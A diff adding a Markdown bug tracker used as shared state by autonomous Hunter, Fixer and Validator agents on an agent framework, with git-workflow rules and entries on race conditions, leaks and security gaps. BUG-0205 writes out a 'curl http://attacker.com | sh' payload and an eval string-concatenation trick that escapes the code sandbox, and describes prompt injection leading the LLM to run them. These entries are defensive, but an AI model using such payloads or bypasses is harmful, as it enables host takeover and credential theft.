@@ -1,0 +1,1058 @@
+# 🐛 Bug Tracker — Agent Shared State
+
+> **This file is the shared state layer between three autonomous agents.**
+> Do NOT manually reorder entries. Agents append and update in-place.
+
+---
+
+## Meta
+
+| Key | Value |
+|---|---|
+| **Last Hunter Scan** | `2026-03-19T23:05:00Z` |
+| **Last Fixer Pass** | `2026-03-19T23:03:23Z` |
+| **Last Validator Pass** | `2026-03-19T22:06:00Z` |
+| **Last Digest Run** | `2026-03-18T00:35:00Z` |
+| **Last Security Scan** | `2026-03-19T19:55:00Z` |
+| **Hunter Loop Interval** | `5min` |
+| **Fixer Loop Interval** | `2min` |
+| **Validator Loop Interval** | `5min` |
+| **Last TestGen Run** | `2026-03-19T23:08:10Z` |
+| **Last Git Manager Pass** | `2026-03-19T07:30:10Z` |
+| **Last Supervisor Pass** | `2026-03-19T21:52:17Z` |
+| **Total Found** | `109` |
+| **Total Pending** | `23` |
+| **Total In Progress** | `0` |
+| **Total Fixed** | `0` |
+| **Total In Validation** | `5` |
+| **Total Verified** | `0` |
+| **Total Blocked** | `4` |
+| **Total Reopened** | `1` |
+
+---
+
+## Status Lifecycle
+
+```
+pending → in-progress → fixed → in-validation → verified → archived to BUG_LOG.md
+                                                → reopened → (re-enters as pending)
+                       → blocked                           ⏸️ (waiting on human)
+```
+
+- **pending** — Logged by Hunter, waiting for Fixer.
+- **in-progress** — Fixer is actively working on it.
+- **fixed** — Fixer believes it is resolved, waiting for Validator.
+- **in-validation** — Validator is actively reviewing the fix.
+- **verified** — Validator confirmed the fix is correct. Archived to `.claude/BUG_LOG.md` and removed from this file.
+- **reopened** — Validator rejected the fix. Re-enters the Fixer's queue as if pending.
+- **blocked** — Fixer cannot resolve without human intervention.
+
+---
+
+## Agent Instructions
+
+### Bug Hunter Agent (Producer)
+
+1. Scan the codebase for bugs, gaps, type errors, missing error handling, race conditions, etc.
+2. Check this file first — do NOT add duplicates (match on `file` + `line` + `description` similarity).
+3. Before logging a new bug, verify it is actually present on `main`: `git stash && git checkout main && git pull --ff-only` then check the file. If the bug is already fixed on main, do NOT log it.
+4. Append new bugs to the `## Bugs` section using the exact template below.
+5. Update the `Meta` table counters and `Last Hunter Scan` timestamp.
+6. Assign the next sequential `BUG-XXXX` ID.
+7. **Your fields:** `status` (set to `pending`), `severity`, `file`, `line`, `category`, `description`, `context`, `hunter_found`.
+8. **Do not touch:** `fixer_*`, `fix_summary`, `validator_*`, `validator_notes`, `branch`, `reopen_count`.
+
+### Bug Fixer Agent (Consumer)
+
+1. Read the `## Bugs` section and filter for `reopened` bugs first (highest priority — these already failed validation), then `pending` entries (oldest first within severity tiers).
+2. Set `status: in-progress` and fill `fixer_started` before beginning work.
+3. When picking up a `reopened` bug, **read `validator_notes` carefully** — the Validator explained exactly what was wrong with your previous attempt.
+
+#### Git Workflow (CRITICAL — follow exactly)
+
+4. **Ensure clean state:** Run `git stash` to stash any uncommitted changes, then `git checkout main && git pull --ff-only` to get latest main.
+5. **Create or recreate branch:**
+   - For `pending` bugs: `git checkout -b bugfix/BUG-XXXX main`
+   - For `reopened` bugs: **always delete the old branch** (`git branch -D bugfix/BUG-XXXX`) and create fresh from current main (`git checkout -b bugfix/BUG-XXXX main`). Never reuse a stale branch.
+6. **Verify you are on the correct branch** before making any changes: `git branch --show-current` must output `bugfix/BUG-XXXX`.
+7. **Fix the bug** in the codebase. If the fix changes an API, also update test mocks/fixtures.
+8. **Commit the fix** on the bugfix branch: `git add <changed-files> && git commit -m "fix(BUG-XXXX): <description>"`.
+9. **Verify the fix is on the branch** — this is mandatory before marking fixed:
+   - `git diff main bugfix/BUG-XXXX -- <file>` must show your changes.
+   - If the diff is empty, your commit landed on the wrong branch. **Do not mark fixed.** Investigate and redo.
+10. **Check for conflicts with main preemptively:** `git merge-tree $(git merge-base main bugfix/BUG-XXXX) main bugfix/BUG-XXXX` — if this shows conflicts, rebase now: `git rebase main` and resolve before marking fixed.
+11. **Switch back to main:** `git checkout main` — do NOT leave the worktree on the bugfix branch.
+12. **Pop stash if needed:** `git stash pop` (only if you stashed in step 4).
+13. Set `status: fixed`, fill `fix_summary`, `fixer_completed`, and `branch` (set to `bugfix/BUG-XXXX`).
+14. Increment `reopen_count` if this was a reopened bug.
+15. If the bug cannot be fixed (needs human decision, new dependency, etc.), set `status: blocked` and explain in `fix_summary`.
+
+#### Guardrails
+- **One bug at a time.** Do not work on multiple bugs in parallel within a single session — this causes cross-branch contamination.
+- **Never commit to main directly.** All fixes go on `bugfix/BUG-XXXX` branches.
+- **Auto-block after 3 reopens:** If `reopen_count` reaches 3, set `status: blocked` with `fix_summary: Auto-blocked after 3 failed fix attempts. Requires human review.`
+
+16. Update the `Meta` table counters and `Last Fixer Pass` timestamp.
+17. **Your fields:** `status`, `fixer_started`, `fixer_completed`, `fix_summary`, `branch`, `reopen_count`.
+18. **Do not touch:** `hunter_found`, `severity`, `category`, `validator_*`, `validator_notes`.
+
+### Bug Validator Agent (Quality Gate)
+
+1. Read the `## Bugs` section and filter for `fixed` entries (oldest `fixer_completed` first within severity tiers).
+2. Set `status: in-validation` and fill `validator_started` before beginning review.
+
+#### Pre-flight Checks (before reviewing code)
+
+3. **Verify the branch exists:** `git branch --list bugfix/BUG-XXXX`. If the branch does not exist, immediately set `status: reopened` with `validator_notes` explaining the branch is missing. Do not proceed.
+4. **Verify the branch has changes:** `git diff main bugfix/BUG-XXXX -- <file>` must show relevant changes. If empty, the fix was never committed to this branch. Set `status: reopened` with details.
+5. **Check for merge conflicts:** `git checkout main && git merge --no-commit --no-ff bugfix/BUG-XXXX`. If conflicts occur, run `git merge --abort`, set `status: reopened` with `validator_notes: Merge conflict in <files>. Fixer must delete old branch and recreate from current main.` Do not proceed.
+
+#### Code Review
+
+6. Verify the fix: read the original bug, read the `fix_summary`, then read the actual code on the branch to confirm correctness.
+7. If the fix changes an API surface, verify test mocks/fixtures were updated too.
+8. Run automated checks **on the bugfix branch**: `git checkout bugfix/BUG-XXXX` then run type checker (`npx tsc --noEmit`), tests (`npm test`), and build (`npm run build`).
+
+#### On Validation Success — Merge, Archive, Cleanup
+
+9. **Merge to main:**
+   ```
+   git checkout main
+   git merge bugfix/BUG-XXXX -m "Merge branch 'bugfix/BUG-XXXX'"
+   ```
+10. **Verify merge succeeded:** `git diff main bugfix/BUG-XXXX` should be empty (all changes now on main). If not, investigate.
+11. **Delete the bugfix branch:** `git branch -d bugfix/BUG-XXXX`
+12. **Archive the entry:** Append the full bug entry (with all fields filled) to `.claude/BUG_LOG.md`. Include `archived` timestamp.
+13. **Remove the entry from this file** (BUG_TRACKER.md) — verified bugs should not remain here.
+14. Set `status: verified`, fill `validator_completed` and `validator_notes` (in the archived entry).
+
+#### On Validation Failure — Reopen
+
+15. If any check fails: `git checkout main` (abandon the branch review).
+16. Set `status: reopened`, **clear** `fixer_started`, `fixer_completed`, and `fix_summary`.
+17. Fill `validator_completed` and `validator_notes` with **specific failure details** — the Fixer depends on this to avoid repeating the same mistake.
+18. Increment `reopen_count`. If it reaches 3, set `status: blocked` instead of `reopened` with note `Auto-blocked after 3 failed fix attempts. Requires human review.`
+
+#### Final
+
+19. Update the `Meta` table counters and `Last Validator Pass` timestamp.
+20. **Your fields:** `status`, `validator_started`, `validator_completed`, `validator_notes`, `reopen_count` (increment on failure).
+21. **Do not touch:** `hunter_found`, `severity`, `category` (except to clear fixer fields on reopen as specified above).
+
+---
+
+## Bug Entry Template
+
+```markdown
+### BUG-XXXX
+- **status:** `pending` | `in-progress` | `fixed` | `in-validation` | `verified` | `reopened` | `blocked`
+- **severity:** `critical` | `high` | `medium` | `low`
+- **file:** `path/to/file.ts`
+- **line:** `42`
+- **category:** `type-error` | `logic-bug` | `missing-error-handling` | `race-condition` | `memory-leak` | `security` | `dead-code` | `other`
+- **description:** Brief description of the bug or gap.
+- **context:** Why this is a problem / what could go wrong.
+- **reopen_count:** `0`
+- **branch:** ``
+- **hunter_found:** `2026-03-13T10:00:00Z`
+- **fixer_started:** ``
+- **fixer_completed:** ``
+- **fix_summary:** ``
+- **validator_started:** ``
+- **validator_completed:** ``
+- **validator_notes:** ``
+```
+
+---
+
+## Bugs
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+### BUG-0191
+- **status:** `blocked`
+- **severity:** `low`
+- **file:** `src/config/types.ts`
+- **line:** `76`
+- **category:** `dead-code`
+- **description:** The `plugins?: string[]` field is declared in `ONIConfig` but is never read or acted upon anywhere in the codebase — no plugin loading, resolution, or import logic exists.
+- **context:** The field appears in the public config schema, implying to users that plugin paths can be provided to extend the system. Because no consumer ever reads `config.plugins`, any value set in `oni.jsonc` under `plugins` is silently ignored. This creates a misleading API contract: operators who configure plugins believe they are extending the agent, but nothing happens. Either the plugin loading mechanism should be implemented, or the field should be removed from `ONIConfig` to prevent false expectations.
+- **reopen_count:** `0`
+- **branch:** ``
+- **hunter_found:** `2026-03-17T22:56:07Z`
+- **fixer_started:** `2026-03-17T23:26:57Z`
+- **fixer_completed:** ``
+- **fix_summary:** `Removing plugins field changes the public ONIConfig type. Implementing plugin loading is a feature, not a bug fix. Needs human decision: remove the field (API change) or implement the feature. Blocked per rule: "Changes public API → needs human approval."`
+- **validator_started:** ``
+- **validator_completed:** ``
+- **validator_notes:** ``
+
+---
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+### BUG-0205
+- **status:** `blocked`
+- **severity:** `critical`
+- **file:** `packages/tools/src/code-execution/node-eval.ts`
+- **line:** `57`
+- **category:** `security-injection`
+- **description:** The `node_eval` tool executes LLM-supplied code via `new Function(_input)` in an unrestricted Node.js child process with no capability sandbox, giving arbitrary code full access to the filesystem, network, and ability to spawn subprocesses.
+- **context:** Although the code runs in a child process, the child script applies no restrictions to what Node.js builtins the executed code can call. An LLM-generated payload such as `require('child_process').execSync('curl http://attacker.com | sh')` or `require('fs').readFileSync('/etc/passwd')` would succeed. `safeEnv()` only strips inherited environment variables — it does not prevent filesystem access or network calls. Any prompt-injection attack that tricks the LLM into calling `node_eval` with malicious code achieves full host RCE. The fix requires passing Node.js `--experimental-permission` flags (`--allow-fs-read`, `--allow-net` with explicit allowlists and `--deny-all` default) or migrating to a proper sandbox. OWASP A03:2021 - Injection.
+- **reopen_count:** `3`
+- **branch:** ``
+- **hunter_found:** `2026-03-17T03:05:00Z`
+- **fixer_started:** ``
+- **fixer_completed:** ``
+- **fix_summary:** `Auto-blocked after 3 failed fix attempts. Requires human review. Network gap: ESM import() of builtins bypasses CJS-level patches; --experimental-permission has no network permission. Needs isolated-vm or container-level sandboxing.`
+- **validator_started:** `2026-03-18T01:20:50Z`
+- **validator_completed:** `2026-03-18T01:30:00Z`
+- **validator_notes:** `REOPENED (3rd): [What] Network access still exploitable. [Why] GOOD: --experimental-permission blocks fs-write, child_process, worker_threads. IIFE scope isolation hides security vars. CJS require() blocked. BAD: eval("imp"+"ort('net')") bypasses import() regex via string concatenation, and ESM import() does not go through Module._resolveFilename (CJS-only hook). --experimental-permission has no network permission concept. [Fix approach] Close the network gap: (1) Override globalThis.eval = () => throw, blocking the concatenation trick. (2) Or use --import ESM loader hooks to intercept ESM resolution of network builtins. (3) Or accept the network gap is architectural and block this bug for human decision on whether to adopt isolated-vm or container-level sandboxing.`
+
+---
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+### BUG-0235
+- **status:** `blocked`
+- **severity:** `high`
+- **file:** `src/errors.ts`
+- **line:** `44`
+- **category:** `test-regression`
+- **description:** Tests "toJSON() returns structured representation" and all "has correct fields" tests in errors.test.ts fail: `ONIError.toJSON()` omits `stack` (type `undefined` not `string`) and `context` fields that tests expect.
+- **context:** CI Sentinel detected regression on main branch. `toJSON()` returns 6 fields (`name`, `code`, `category`, `message`, `recoverable`, `suggestion`) but tests assert `typeof json.stack === "string"` and expect `context` in the result. The internal `toInternalJSON()` method contains both fields. Either `toJSON()` was refactored to remove `stack`/`context` without updating the 13 test assertions, or the tests were written against an expected API that was never implemented. 13 tests fail across all ONIError subclasses in `src/__tests__/errors.test.ts`.
+- **reopen_count:** `0`
+- **branch:** ``
+- **hunter_found:** `2026-03-19T00:16:00Z`
+- **fixer_started:** `2026-03-19T07:21:00Z`
+- **fixer_completed:** `2026-03-19T07:25:00Z`
+- **fix_summary:** `False positive. Current toJSON() in src/errors.ts already returns all 8 fields including stack and context. No toInternalJSON() method exists. All 18 tests in errors.test.ts pass on main. Hunter should re-evaluate.`
+- **validator_started:** ``
+- **validator_completed:** ``
+- **validator_notes:** ``
+
+---
+
+### BUG-0236
+- **status:** `blocked`
+- **severity:** `high`
+- **file:** `src/checkpointers/redis.ts`
+- **line:** `52`
+- **category:** `test-regression`
+- **description:** All 8 RedisCheckpointer tests fail with `TypeError: r.eval is not a function` — the ioredis mock in `src/__tests__/redis-checkpointer.test.ts` does not stub the `eval` method that `RedisCheckpointer` now calls.
+- **context:** CI Sentinel detected regression on main branch. `src/checkpointers/redis.ts:52` maps `eval: (script, numkeys, ...args) => r.eval(script, numkeys, ...)` in the adapter object, but the vi mock for ioredis in the test file does not include an `eval` stub. Every test that calls `put()` triggers this path and throws immediately. The fix is to add `eval: vi.fn()` (or equivalent) to the mock ioredis object in the test. All 8 non-skipped tests in `src/__tests__/redis-checkpointer.test.ts` are affected.
+- **reopen_count:** `0`
+- **branch:** ``
+- **hunter_found:** `2026-03-19T00:16:00Z`
+- **fixer_started:** `2026-03-19T07:21:00Z`
+- **fixer_completed:** `2026-03-19T07:25:00Z`
+- **fix_summary:** `False positive. Current redis.ts has no eval() call at line 52 or anywhere. The ioredis mock does not need an eval stub. All 12 mocked tests pass (2 integration tests correctly skipped). Hunter should re-evaluate.`
+- **validator_started:** ``
+- **validator_completed:** ``
+- **validator_notes:** ``
+
+---
+
+
+
+
+
+### BUG-0244
+- **status:** `in-validation`
+- **severity:** `medium`
+- **file:** `src/cli/build.ts`
+- **line:** `41`
+- **category:** `security-injection`
+- **description:** `spawn("npx", tscArgs, { shell: true })` invokes the system shell unnecessarily, creating a latent shell injection vector inconsistent with the rest of the CLI.
+- **context:** `shell: true` causes `/bin/sh -c "npx tsc ..."` which interprets shell metacharacters. Currently `tscArgs` is `["tsc"]` or `["tsc", "--noCheck"]` so no immediate exploit exists. However `src/cli/run.ts` and `src/cli/dev.ts` perform identical spawns without `shell: true`. Any future change adding user-supplied flags to `tscArgs` would be immediately shell-injectable. Fix: remove `shell: true` to match the rest of the CLI. OWASP A03:2021 - Injection.
+- **reopen_count:** `0`
+- **branch:** `bugfix/BUG-0244`
+- **hunter_found:** `2026-03-19T17:35:00Z`
+- **fixer_started:** `2026-03-19T23:03:23Z`
+- **fixer_completed:** `2026-03-19T23:03:23Z`
+- **fix_summary:** `Removed shell: true from spawn("npx", tscArgs, ...) in src/cli/build.ts. Options object now only contains stdio: "inherit", matching the pattern in run.ts and dev.ts.`
+- **validator_started:** `2026-03-19T23:15:00Z`
+- **validator_completed:** ``
+- **validator_notes:** ``
+
+---
+
+### BUG-0245
+- **status:** `in-validation`
+- **severity:** `medium`
+- **file:** `examples/harness/codebase-audit.ts`
+- **line:** `58`
+- **category:** `security-injection`
+- **description:** LLM-exposed `read_file` tool calls `readFile(input.path)` with no path sanitization, allowing the LLM or prompt injection to read arbitrary files on the host.
+- **context:** `input.path` from the LLM flows directly to `fs.readFile()` with no validation — no allowlist, no boundary check, no symlink resolution. A prompt injection in audited code could read `/etc/passwd`, `~/.ssh/id_rsa`, or cloud credentials. Same pattern in `examples/audit-system/audit-agent.ts:100`. The production tool at `packages/tools/src/filesystem/index.ts` correctly uses `checkAllowedPath()`. Fix: add equivalent path boundary check. OWASP A01:2021 - Broken Access Control.
+- **reopen_count:** `0`
+- **branch:** `bugfix/BUG-0245`
+- **hunter_found:** `2026-03-19T17:35:00Z`
+- **fixer_started:** `2026-03-19T23:03:23Z`
+- **fixer_completed:** `2026-03-19T23:03:23Z`
+- **fix_summary:** `Added path boundary checks to read_file tools in examples/harness/codebase-audit.ts and examples/audit-system/audit-agent.ts. Both now resolve and normalize the input path, then verify it starts with process.cwd() before reading. Mirrors checkAllowedPath() from production tools.`
+- **validator_started:** `2026-03-19T23:15:00Z`
+- **validator_completed:** ``
+- **validator_notes:** ``
+
+---
+
+### BUG-0246
+- **status:** `in-validation`
+- **severity:** `high`
+- **file:** `src/guardrails/budget.ts`
+- **line:** `51`
+- **category:** `race-condition`
+- **reopen_count:** `2`
+- **branch:** `bugfix/BUG-0246`
+- **description:** `BudgetTracker.record()` performs non-atomic read-modify-write on shared `agentTokens` Map and `totalInput`/`totalOutput`/`totalCost` counters, causing lost updates when parallel nodes call it concurrently across await boundaries.
+- **context:** During parallel superstep execution (`streaming.ts` line 203), multiple nodes call `_recordUsage → budgetTracker.record()` concurrently. Node A reads `existing = { input: 100 }`, yields at an await, Node B reads the same stale value before A writes back — one increment is silently lost. This defeats token budget limits (`maxTokensPerAgent`, `maxTokensPerRun`, `maxCostPerRun`), allowing agents to exceed budgets without triggering the breaker.
+- **hunter_found:** `2026-03-19T18:45:00Z`
+- **fixer_started:** `2026-03-19T23:03:23Z`
+- **fixer_completed:** `2026-03-19T23:03:23Z`
+- **fix_summary:** `Refactored agentTokens update in BudgetTracker.record() to use has/set/get! pattern for atomic in-place mutation. Preserved the else branch for unknown modelId that emits console.warn and pushes budget.unknown_pricing audit entry, restoring observability removed by previous fix.`
+- **validator_started:** `2026-03-19T23:15:00Z`
+- **validator_completed:** ``
+- **validator_notes:** ``
+
+---
+
+
+### BUG-0248
+- **status:** `reopened`
+- **severity:** `high`
+- **file:** `src/swarm/pool.ts`
+- **line:** `228`
+- **category:** `race-condition`
+- **reopen_count:** `1`
+- **branch:** `bugfix/BUG-0248`
+- **description:** The queue drain path in the `finally` block of `runOnSlot()` uses `Promise.resolve().then(...)` to defer dispatch, creating a window where `invoke()` can also dispatch to the now-idle slot, violating `maxConcurrency = 1`.
+- **context:** When a slot finishes, `activeTasks--` runs synchronously but the queued item is dispatched via a deferred microtask. Between decrement and microtask execution, a concurrent `invoke()` call sees the idle slot via `pickSlot()`, dispatches to it, and increments `activeTasks` to 1. Then the deferred microtask fires and also dispatches via `runOnSlot`, incrementing to 2. Two tasks run concurrently on a slot configured for exclusive access, corrupting any agent state that assumes single-occupancy.
+- **hunter_found:** `2026-03-19T18:45:00Z`
+- **fixer_started:** ``
+- **fixer_completed:** ``
+- **fix_summary:** ``
+- **validator_started:** `2026-03-19T21:57:00Z`
+- **validator_completed:** `2026-03-19T22:01:00Z`
+- **validator_notes:** `REOPENED: Finally block fix is correct — synchronous runOnSlot() call closes the race window. However, addSlots() was NOT updated: (1) it still manually increments slot.activeTasks++ before calling runOnSlot(), but runOnSlot() now unconditionally increments too (the preIncremented parameter was removed), causing double-increment — slot appears at activeTasks=2 with only 1 task running, starving capacity. (2) addSlots() still uses Promise.resolve().then() for dispatch, retaining the original deferred-dispatch race in that code path. Fix must update addSlots() to remove manual increment and use synchronous dispatch.`
+
+---
+
+### BUG-0249
+- **status:** `in-validation`
+- **severity:** `medium`
+- **file:** `src/swarm/scaling.ts`
+- **line:** `354`
+- **category:** `race-condition`
+- **reopen_count:** `0`
+- **branch:** `bugfix/BUG-0249`
+- **description:** The reactive subscription handler calls `evaluate()` then `recordDecision()` non-atomically, so a re-entrant `tracer.record()` from a callback can bypass the cooldown check and issue duplicate scale decisions for a single event.
+- **context:** `tracer.record()` calls listeners synchronously. If a callback at line 359 triggers another `tracer.record()`, two `evaluate()` calls read the same stale `lastDecisionTime`, both pass the cooldown check, and two scale-up decisions fire for one error event. This defeats the cooldown mechanism and can cause 2x the intended scaling, leading to resource exhaustion.
+- **hunter_found:** `2026-03-19T18:45:00Z`
+- **fixer_started:** `2026-03-19T23:03:23Z`
+- **fixer_completed:** `2026-03-19T23:03:23Z`
+- **fix_summary:** `Added private _evaluating boolean re-entrancy guard to the reactive subscription handler in src/swarm/scaling.ts. Handler returns early if already evaluating, with try/finally to ensure flag is always reset. Prevents duplicate scale decisions from re-entrant tracer.record() calls.`
+- **validator_started:** `2026-03-19T23:15:00Z`
+- **validator_completed:** ``
+- **validator_notes:** ``
+
+---
+
+### BUG-0250
+- **status:** `pending`
+- **severity:** `medium`
+- **file:** `src/harness/loop/inference.ts`
+- **line:** `156`
+- **category:** `memory-leak`
+- **reopen_count:** `0`
+- **branch:** ``
+- **description:** In the no-signal retry delay path, `setTimeout(resolve, delayMs)` is called without storing the timer handle, so it cannot be cleared if the calling agent loop is abandoned.
+- **context:** The `if (config.signal)` branch above (lines 147-154) correctly stores the handle and calls `clearTimeout` on abort. The `else` branch at line 156 discards the handle. Under sustained rate limiting (429s) with `maxRetries = 3`, each agent accumulates up to three long-lived dangling timers that hold their closure graph alive for the full retry delay duration.
+- **hunter_found:** `2026-03-19T18:45:00Z`
+- **fixer_started:** ``
+- **fixer_completed:** ``
+- **fix_summary:** ``
+- **validator_started:** ``
+- **validator_completed:** ``
+- **validator_notes:** ``
+
+---
+
+### BUG-0251
+- **status:** `pending`
+- **severity:** `medium`
+- **file:** `src/swarm/pool.ts`
+- **line:** `63`
+- **category:** `memory-leak`
+- **reopen_count:** `0`
+- **branch:** ``
+- **description:** `AgentPool` has no `dispose()` method to drain or reject queued items, so abandoning the pool mid-operation leaks all queued Promise resolvers and their captured state objects indefinitely.
+- **context:** The `queue` array holds `{ input, config, resolve, reject }` objects where `input` can be a large agent state. If the owning swarm shuts down without draining the queue, all queued items remain in memory with live Promise resolvers holding their closures. Contrast with `RequestReplyBroker.dispose()` and `EventBus.dispose()` which explicitly reject/clear pending state on teardown.
+- **hunter_found:** `2026-03-19T18:45:00Z`
+- **fixer_started:** ``
+- **fixer_completed:** ``
+- **fix_summary:** ``
+- **validator_started:** ``
+- **validator_completed:** ``
+- **validator_notes:** ``
+
+---
+
+### BUG-0252
+- **status:** `pending`
+- **severity:** `medium`
+- **file:** `src/pregel/index.ts`
+- **line:** `162`
+- **category:** `logic-bug`
+- **reopen_count:** `0`
+- **branch:** ``
+- **description:** `ONIPregelRunner.batch()` uses `Promise.all`, so one rejected invocation cancels the entire batch and discards results from all other invocations, which continue running as orphaned promises with no cleanup.
+- **context:** A caller invoking a batch of 10 independent inputs where input 2 fails gets nothing back, while inputs 3-10 continue executing silently in the background. The parallel fan-out inside `streamSupersteps` correctly uses `Promise.allSettled` (streaming.ts line 203) for exactly this reason.
+- **hunter_found:** `2026-03-19T18:45:00Z`
+- **fixer_started:** ``
+- **fixer_completed:** ``
+- **fix_summary:** ``
+- **validator_started:** ``
+- **validator_completed:** ``
+- **validator_notes:** ``
+
+---
+
+### BUG-0253
+- **status:** `pending`
+- **severity:** `medium`
+- **file:** `src/swarm/self-improvement/experiment-log.ts`
+- **line:** `57`
+- **category:** `logic-bug`
+- **reopen_count:** `0`
+- **branch:** ``
+- **description:** `ExperimentLog.summarize()` always computes delta as `metricAfter - metricBefore` regardless of experiment direction, so "minimize" metric improvements appear as negative deltas in the summary fed to the LLM.
+- **context:** `pattern-learner.ts` correctly handles direction-aware gain (BUG-0017 fix), but `summarize()` does not respect the `direction` field. A latency reduction of 50ms appears as `delta: -0.050` instead of `+0.050`, making successful "minimize" experiments look like regressions to the LLM. Regression of BUG-0017 in a different code path.
+- **hunter_found:** `2026-03-19T18:45:00Z`
+- **fixer_started:** ``
+- **fixer_completed:** ``
+- **fix_summary:** ``
+- **validator_started:** ``
+- **validator_completed:** ``
+- **validator_notes:** ``
+
+---
+
+### BUG-0254
+- **status:** `pending`
+- **severity:** `medium`
+- **file:** `src/pregel/streaming.ts`
+- **line:** `372`
+- **category:** `logic-bug`
+- **reopen_count:** `0`
+- **branch:** ``
+- **description:** Custom and message stream events from nodes that throw are silently dropped because `allCustomEvents.push(...)` and `allMessageEvents.push(...)` at lines 372-374 are after the try/catch/finally block and unreachable on the error path.
+- **context:** When a node emits custom/message events via `writerImpl` then subsequently throws, those events are captured in closure-local arrays but never pushed to the outer collection arrays. Stream consumers monitoring partial output lose all events emitted before the failure. Fix: move the push calls into the `finally` block.
+- **hunter_found:** `2026-03-19T18:45:00Z`
+- **fixer_started:** ``
+- **fixer_completed:** ``
+- **fix_summary:** ``
+- **validator_started:** ``
+- **validator_completed:** ``
+- **validator_notes:** ``
+
+---
+
+### BUG-0255
+- **status:** `pending`
+- **severity:** `medium`
+- **file:** `src/swarm/pool.ts`
+- **line:** `74`
+- **category:** `logic-bug`
+- **reopen_count:** `0`
+- **branch:** ``
+- **description:** `AgentPool.batch()` uses `Promise.all`, so one failing slot invocation cancels the entire batch while remaining invocations continue running as orphaned promises.
+- **context:** Same class of issue as BUG-0252 (`ONIPregelRunner.batch()`). The pool already provides `batchSettled()` at line 78 which uses `Promise.allSettled`, but the primary `batch()` method gives callers no way to get partial results.
+- **hunter_found:** `2026-03-19T18:45:00Z`
+- **fixer_started:** ``
+- **fixer_completed:** ``
+- **fix_summary:** ``
+- **validator_started:** `2026-03-19T19:48:00Z`
+- **validator_completed:** ``
+- **validator_notes:** ``
+
+---
+
+### BUG-0256
+- **status:** `pending`
+- **severity:** `medium`
+- **file:** `packages/a2a/src/server/index.ts`
+- **line:** `11`
+- **category:** `security-auth`
+- **description:** `A2AServer` authentication is opt-in via an optional `apiKey` field — when omitted (the default), all RPC methods including `tasks/send` are publicly accessible with no authentication, rate limiting, or compensating control.
+- **context:** The `apiKey` option defaults to `undefined`, making unauthenticated deployment the path of least resistance. An unauthenticated server accepts `tasks/send` which executes the registered `TaskHandler` — potentially invoking LLM calls, tool execution, and database writes. No warning is logged when auth is disabled. A single shared API key also means no per-method authorization (read vs write). OWASP A07:2021 - Identification and Authentication Failures.
+- **reopen_count:** `0`
+- **branch:** ``
+- **hunter_found:** `2026-03-19T19:55:00Z`
+- **fixer_started:** ``
+- **fixer_completed:** ``
+- **fix_summary:** ``
+- **validator_started:** ``
+- **validator_completed:** ``
+- **validator_notes:** ``
+
+---
+
+### BUG-0257
+- **status:** `pending`
+- **severity:** `medium`
+- **file:** `packages/a2a/src/server/index.ts`
+- **line:** `154`
+- **category:** `security-config`
+- **description:** `A2AServer` HTTP responses include no security headers — missing `X-Content-Type-Options: nosniff`, `X-Frame-Options`, `Content-Security-Policy`, and `Strict-Transport-Security` on all response paths.
+- **context:** The `requestHandler()` and `listen()` methods set only `Content-Type: application/json`. Without `X-Content-Type-Options: nosniff`, browsers may MIME-sniff JSON responses as HTML in edge cases, enabling XSS via crafted JSON payloads. Missing `X-Frame-Options` allows clickjacking if the server ever returns HTML. The CORS-by-omission approach (no `Access-Control-Allow-Origin` header) works but is fragile — a future debug addition could silently open cross-origin access. OWASP A05:2021 - Security Misconfiguration.
+- **reopen_count:** `0`
+- **branch:** ``
+- **hunter_found:** `2026-03-19T19:55:00Z`
+- **fixer_started:** ``
+- **fixer_completed:** ``
+- **fix_summary:** ``
+- **validator_started:** ``
+- **validator_completed:** ``
+- **validator_notes:** ``
+
+---
+
+### BUG-0258
+- **status:** `pending`
+- **severity:** `medium`
+- **file:** `packages/integrations/src/adapter/auth-resolver.ts`
+- **line:** `48`
+- **category:** `security-secrets`
+- **description:** `storeAuthResolver` reads integration credentials (API keys, OAuth2 tokens) from a generic `SimpleStore` under a plain `["credentials"]` namespace with no encryption at rest, no access scoping, and no audit trail.
+- **context:** Any code with access to the `store` object can enumerate all integration credentials by iterating known integration keys via `store.get(["credentials"], key)`. The `SimpleStore` interface accepts any backing implementation — if a caller provides a store that persists to disk without file permissions or to an unencrypted database, credentials leak silently. The error message at line 51 also discloses the exact store path and key format, aiding enumeration. Contrast with production tool paths that use scoped access. OWASP A02:2021 - Cryptographic Failures.
+- **reopen_count:** `0`
+- **branch:** ``
+- **hunter_found:** `2026-03-19T19:55:00Z`
+- **fixer_started:** ``
+- **fixer_completed:** ``
+- **fix_summary:** ``
+- **validator_started:** ``
+- **validator_completed:** ``
+- **validator_notes:** ``
+
+---
+
+### BUG-0259
+- **status:** `pending`
+- **severity:** `medium`
+- **file:** `src/harness/memory/ranker.ts`
+- **line:** `41`
+- **category:** `logic-bug`
+- **reopen_count:** `0`
+- **branch:** ``
+- **description:** Non-episodic memory units with zero tag overlap pass the relevance filter because the hardcoded `recencyScore = 1` for non-episodic types yields a minimum score of `0.2`, which equals the default `matchThreshold`.
+- **context:** `scoreRelevance` returns `tagScore * 0.8 + recencyScore * 0.2`. For semantic/procedural/identity units, `recencyScore` is always `1`. With zero tag overlap (`tagScore = 0`), the score is `0 * 0.8 + 1 * 0.2 = 0.2`. The filter at line 101 uses `score >= matchThreshold` where default threshold is `0.2`, so completely irrelevant non-episodic units pass. This wastes token budget on memory with no topical relationship to the current task.
+- **hunter_found:** `2026-03-19T15:11:42Z`
+- **fixer_started:** ``
+- **fixer_completed:** ``
+- **fix_summary:** ``
+- **validator_started:** ``
+- **validator_completed:** ``
+- **validator_notes:** ``
+
+---
+
+### BUG-0260
+- **status:** `pending`
+- **severity:** `medium`
+- **file:** `src/harness/memory/ranker.ts`
+- **line:** `94`
+- **category:** `logic-bug`
+- **reopen_count:** `0`
+- **branch:** ``
+- **description:** `rankAndLoad` silently returns an empty `LoadResult` when the task string contains only short words (<3 chars) or stopwords, with no warning or fallback.
+- **context:** `extractTagsFromString` strips words shorter than 3 characters and removes stopwords. Tasks like `"go"`, `"do it"`, `"run"`, or `"ok"` produce `taskTags = []`, causing the function to return `{ units: [], totalTokens: 0 }` with no log message. The caller (`MemoryLoader.match()`) receives an empty result with no indication that memory loading was skipped entirely. The agent proceeds with no domain context loaded.
+- **hunter_found:** `2026-03-19T15:11:42Z`
+- **fixer_started:** ``
+- **fixer_completed:** ``
+- **fix_summary:** ``
